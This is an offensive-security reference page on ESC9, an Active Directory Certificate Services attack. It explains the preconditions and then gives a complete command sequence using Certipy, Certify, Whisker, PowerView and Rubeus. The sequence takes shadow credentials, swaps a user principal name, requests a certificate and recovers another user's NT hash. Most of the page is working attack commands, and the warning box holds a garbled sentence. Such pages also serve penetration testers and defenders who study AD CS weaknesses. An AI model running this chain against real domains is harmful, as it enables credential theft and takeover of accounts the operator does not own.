# (ESC9) No security extension 

To understand this privilege escalation, it is recommended to know how certificate mapping is performed.

If the certificate attribute `msPKI-Enrollment-Flag` contains the flag `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` extension will not be embedded, meaning that even with `StrongCertificateBindingEnforcement` set to `1`, the mapping will be performed similarly as a value of `0` in the registry key.

Here are the requirements to perform ESC9:

* `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag (`0x4`)
* The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* The template specifies client authentication
* `GenericWrite` right against any account A to compromise any account B

> [!WARNING]
> Acate can then be used with to obtain a TGT and *potentially* authenticate, there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` or the `CertificateMappingMethods` values. It is worth to try the attack hopping the keys are misconfigured.


From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used to enumerate for, and conduct, the ESC9 scenario.

In this scenario, user1 has `GenericWrite` against user2 and wants to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.
```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the `userPrincipalName` of user2 is changed to user3.
```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

The vulnerable certificate can be requested as user2.
```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

The user2's UPN is changed back to something else.
```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. The domain must be specified since it is not present in the certificate.
```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

From Windows systems, the [Certify](https://github.com/GhostPack/Certify) tool can be used.
```powershell
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /currentuser
```

Here, user1 has `GenericWrite` against user2 and want to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

First, the user2's credentials are needed. It can be retrieved via a Shadow Credentials attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):
```powershell
Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```

Then, the `userPrincipalName` of user2 is changed to user3 with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
```powershell
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
```

The vulnerable certificate can be requested in a user2 session.
```powershell
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
```

The user2's UPN is changed back to something else.
```powershell
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
```

Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. This action can be realised with [Rubeus](https://github.com/GhostPack/Rubeus). The domain must be specified since it is not present in the certificate.
```powershell
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
```